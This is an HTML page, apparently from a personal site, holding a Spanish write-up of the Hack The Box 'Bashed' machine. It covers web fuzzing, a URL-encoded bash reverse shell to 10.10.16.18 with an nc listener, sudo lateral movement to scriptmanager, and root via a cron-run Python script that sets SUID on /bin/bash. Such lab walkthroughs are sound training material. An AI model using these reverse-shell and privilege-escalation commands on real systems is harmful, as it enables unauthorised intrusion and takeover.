@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Bashed HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/bashed/pasted-20251025132739.png" alt="Bashed HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Bashed</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>sudoers</span>
+            <span>cron</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing web hasta localizar <code>phpbash</code> en <code>/dev</code></li>
+            <li><code>Explotación</code>: RCE desde la web para obtener shell como <code>www-data</code></li>
+            <li><code>Movimiento lateral</code>: Sudoers permite ejecutar comandos como <code>scriptmanager</code></li>
+            <li><code>Escalada de Privilegios</code>: Cron ejecuta scripts modificables como root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/bashed/pasted-20251025133008.png" alt="Bashed HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Fuzzing encuentra una ruta con un RCE: http://bashed/dev/phpbash.min.php</h3>
+            <pre><code>dirb http://bashed:80</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Rev_Shell desde web hay que encodear caracteres especiales: &amp; -&gt; %26</h3>
+            <pre><code>bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.18/8080 0&gt;%261"
+nc -nlvp 8080</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral (www-data -> scriptmanager)</h2>
+          <div class="code-card">
+            <h3>Sudoers: Podemos ejecutar todos los comandos como el usuario scriptmanager</h3>
+            <pre><code>sudo -l 
+sudo -u scriptmanager whoami 
+sudo -u scriptmanager /bin/bash # Obtenemos una shell como usuario scriptmanager</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Enumerar archivos y directorios donde el propietario es scriptmanager</h3>
+            <pre><code>find / -user scriptmanager 2&gt;/dev/null | grep -v "proc"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/bashed/pasted-20251025153502.png" alt="Bashed HTB" />
+          <p>Mirando la información de los archivos en el directorio <code>scripts</code> se observa que <code>test.py</code> parece ejecutarse <code>cada minuto</code> e intuimos que como <code>root</code></p>
+          <div class="code-card">
+            <h3>Comprobar fechas de modificación de los ficheros</h3>
+            <pre><code>stat /scripts/test.py
+stat /scripts/test.txt</code></pre>
+          </div>
+          <p>Se puede obtener una <code>shell como root</code>  modificando <code>test.py</code></p>
+          <div class="code-card">
+            <h3>nano test.py</h3>
+            <pre><code>import os
+# Si root lo ejecuta y proporciona permisos SUID a la bash
+os.system("chmod u+s /bin/bash")</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Monitorizar permisos para esperar a que se ejecute la tarea cron</h3>
+            <pre><code># n1 -&gt; cada segundo
+watch -n1 ls -l /bin/bash</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Conectarnos como root</h3>
+            <pre><code>bash -p</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>sudoers</span>
+            <span>cron</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
